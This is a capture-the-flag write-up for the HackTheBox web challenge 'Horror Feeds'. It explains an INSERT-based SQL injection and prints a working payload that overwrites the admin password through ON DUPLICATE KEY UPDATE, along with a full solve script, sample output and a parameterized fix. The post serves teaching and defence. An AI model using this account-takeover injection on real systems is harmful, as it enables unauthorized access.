---
layout: post
title: "Horror Feeds"
date: 2027-07-11 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, sqli, mysql, insert-injection, on-duplicate-key-update, account-takeover, cwe-89, authentication-bypass]
---

## Overview

Horror Feeds is an HTB Web challenge (Easy) themed around haunted CCTV streams. The vulnerability is a [SQL injection (CWE-89)](https://cwe.mitre.org/data/definitions/89.html) in a registration endpoint — specifically, in an **INSERT** statement built with string interpolation, not a SELECT. The twist: the app uses a parameterized SELECT to block re-registration of existing users, so you can't simply inject `' OR 1=1 --` at the login form. Instead, you inject a multi-row INSERT with `ON DUPLICATE KEY UPDATE` to **overwrite admin's password** with a bcrypt hash you control, then log in as admin to reveal the flag.

---

## Source Analysis

`database.py`:

```python
def register(username, password):
    # Parameterized — safe
    exists = query_db('SELECT * FROM users WHERE username = %s', (username,))
    if exists:
        return False

    hashed = generate_password_hash(password)  # bcrypt
    # NOT parameterized — vulnerable
    query_db(f'INSERT INTO users (username, password) VALUES ("{username}", "{hashed}")')
    mysql.connection.commit()
    return True
```

The SELECT guard checks `username` exactly — a never-before-seen string passes. The INSERT then interpolates that same string raw.

`routes.py`:

```python
@web.route('/dashboard')
@is_authenticated
def dashboard():
    current_user = token_verify(session.get('auth'))
    return render_template('dashboard.html', flag=current_app.config['FLAG'], user=current_user.get('username'))
```

The flag is passed to the template, but the template only renders it for `admin`. Any other authenticated user sees the CCTV video grid without the flag.

---

## The Technique

### Step 1 — Compute a known bcrypt hash

```python
import bcrypt
MY_PASS = "pwned123"
MY_HASH = bcrypt.hashpw(MY_PASS.encode(), bcrypt.gensalt(rounds=4)).decode()
# e.g. $2b$04$Qn/jgSPaULZVwWYm8nBhy.322YauG5BTmsymuPBoEb8JY4lZzl6ry
```

### Step 2 — Craft the injection payload

Inject a username that the SELECT finds no match for (novel string), but that the INSERT turns into two rows — one for a throwaway user, one for admin — with `ON DUPLICATE KEY UPDATE`:

```
username = rnduser987", "x"), ("admin", "<MY_HASH>") ON DUPLICATE KEY UPDATE password="<MY_HASH>" -- 
```

The resulting SQL:

```sql
INSERT INTO users (username, password) VALUES 
  ("rnduser987", "x"),
  ("admin", "<MY_HASH>") ON DUPLICATE KEY UPDATE password="<MY_HASH>" -- ", "<server_bcrypt>")
```

Everything after `-- ` is commented out. MySQL processes:
1. Insert `rnduser987` with `"x"` (succeeds — novel user)
2. Insert `admin` with `<MY_HASH>` — admin already exists → `ON DUPLICATE KEY UPDATE` fires → sets admin's password to `<MY_HASH>`

### Step 3 — Log in as admin

```python
s.post("/api/login", json={"username": "admin", "password": MY_PASS})
```

The app runs `bcrypt.checkpw(MY_PASS, MY_HASH)` — it matches. Admin session issued.

### Step 4 — Read the flag

`GET /dashboard` renders the hidden `.flag` div for the admin user.

---

## Solution

`solve.py`:

```python
#!/usr/bin/env python3
import sys, requests, re, bcrypt

HOST = sys.argv[1] if len(sys.argv) > 1 else "target"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
BASE = f"http://{HOST}:{PORT}"

MY_PASS = "pwned123"
MY_HASH = bcrypt.hashpw(MY_PASS.encode(), bcrypt.gensalt(rounds=4)).decode()

injection = f'rndz987", "x"), ("admin", "{MY_HASH}") ON DUPLICATE KEY UPDATE password="{MY_HASH}" -- '

s = requests.Session()
r = s.post(f"{BASE}/api/register", json={"username": injection, "password": "anything"})
print(f"[*] Injection register: {r.status_code} {r.text}")

s2 = requests.Session()
r = s2.post(f"{BASE}/api/login", json={"username": "admin", "password": MY_PASS})
print(f"[*] Admin login: {r.status_code}")

r = s2.get(f"{BASE}/dashboard")
m = re.search(r"HTB\{[^}]+\}", r.text)
if m:
    print(f"\n[+] FLAG: {m.group()}")
```

```
[*] Injection register: 200 {"message":"User registered! Please login"}
[*] Admin login: 200 {"message":"Success"}

[+] FLAG: HTB{...}
```

---

## Why it worked

The developer applied parameterization only to the SELECT (the "safe" query) but not to the INSERT (assumed safe because "we've already blocked duplicates"). This asymmetry is precisely the attack surface: the SELECT guard is bypassed by using a username that the SELECT finds no record for, while the INSERT processes the same string as raw SQL, enabling the attacker to compose arbitrary SQL after the checked prefix.

`ON DUPLICATE KEY UPDATE` is a MySQL extension that turns an INSERT constraint collision into an UPDATE — making it possible to mutate *any existing row*, not just insert a new one.

---

## Fix

```python
# Parameterize BOTH the SELECT and the INSERT
exists = db.execute('SELECT * FROM users WHERE username = %s', (username,))
if exists:
    return False
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
db.execute('INSERT INTO users (username, password) VALUES (%s, %s)', (username, hashed))
```

Never use f-strings or `.format()` for SQL construction — even in "write" operations you consider low-risk.
